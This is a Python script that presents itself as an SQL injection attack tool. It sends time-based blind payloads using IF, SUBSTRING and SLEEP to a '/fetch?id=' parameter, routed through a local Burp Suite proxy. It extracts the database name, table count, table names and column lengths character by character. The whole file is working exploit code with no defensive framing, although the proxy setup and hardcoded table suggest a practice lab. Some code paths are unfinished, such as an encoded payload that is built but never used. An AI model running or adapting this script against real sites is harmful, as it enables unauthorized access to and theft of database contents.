#this code is part of a script to perform SQL injection attacks to enumerate database
import sys
import requests
import urllib3
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#traffic through burp suite
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

#enumerates the database name
def sql_injection_db_name(s,url):
    db_name = ""
    for i in range(1,7):
        for j in range (48,123):
            sqli_payload = f"2 OR IF(SUBSTRING(DATABASE(),{i},1)='{chr(j)}', SLEEP(5), 0);"              
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            response = s.get(f"{url}/fetch?id="+sqli_payload, verify = False, proxies = proxies)
            if response.elapsed.total_seconds() > 3:
                print(f"Found character: {chr(j)} at position {i}")
                db_name += chr(j)
                break
    print(f"DB name found: {db_name}")

#counts the number of tables in the database
def sql_injection_db_table_count(s,url):
    counter = 1
    while True:
        sqli_payload = f"2 OR IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE()) > {counter}, SLEEP(5), 0);"              
        sqli_payload_encoded = urllib.parse.quote(sqli_payload)
        response = s.get(f"{url}/fetch?id="+sqli_payload, verify = False, proxies = proxies)
        if not response.elapsed.total_seconds() > 3:
            return counter
        else:
            counter += 1

# checks the length of a spesific table
def sql_injection_db_table_length(s,url,table_id):
    length = 1
    while True:
        sqli_payload = f"2 OR IF(LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1 OFFSET {table_id - 1})) > {length}, SLEEP(5), 0);"              
        sqli_payload_encoded = urllib.parse.quote(sqli_payload)
        response = s.get(f"{url}/fetch?id="+sqli_payload, verify = False, proxies = proxies)
        if not response.elapsed.total_seconds() > 3:
            return length
        else:
            length += 1

# enumerates the names of the tables in the database
def sql_injection_db_table_name(s,url,table_id,table_length):
    table_name = ""
    for i in range(1,table_length + 1):
        for j in range (48,123):
            sqli_payload = f"2 OR IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1 OFFSET {table_id - 1}),{i},1)='{chr(j)}', SLEEP(5), 0);"              
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            response = s.get(f"{url}/fetch?id="+sqli_payload, verify = False, proxies = proxies)
            if response.elapsed.total_seconds() > 3:
                print(f"Found character: {chr(j)} at position {i} in table {table_id}")
                table_name += chr(j)
                break
    return table_name

# This function combines the previous functions to enumerate all tables in the database
def sql_injaction_db_tables_enumeration(s,url):
    table_count = sql_injection_db_table_count(s,url)
    print(f"(+) Number of tables in the database: {table_count}")
    for i in range(1,table_count + 1):
        table_length = sql_injection_db_table_length(s,url,i)
        table_name = sql_injection_db_table_name(s,url,i,table_length)
        print(f"(+) Table {i} name: {table_name}")

def sql_injaction_column_name_length(s,url,table_name,column_id):
    print("starts")
    length = 1
    while True:
        sqli_payload = f"2 OR IF((SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='{table_name.lower()}' LIMIT 1 OFFSET {column_id - 1}) > {length}, SLEEP(3), 0);"              
        sqli_payload_encoded = urllib.parse.quote(sqli_payload)
        response = s.get(f"{url}/fetch?id="+sqli_payload, verify = False, proxies = proxies)
        if not response.elapsed.total_seconds() > 3:
            return length
        else:
            length += 1
            

                   
def main():
    if len(sys.argv) !=2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    s = requests.Session()
    url = sys.argv[1]
    print("(+)  Starting DB enumaration...")
    length = sql_injaction_column_name_length(s,url,"PHOTOS",1)
    print(f"{length}")

if __name__ == "__main__":
    main()
   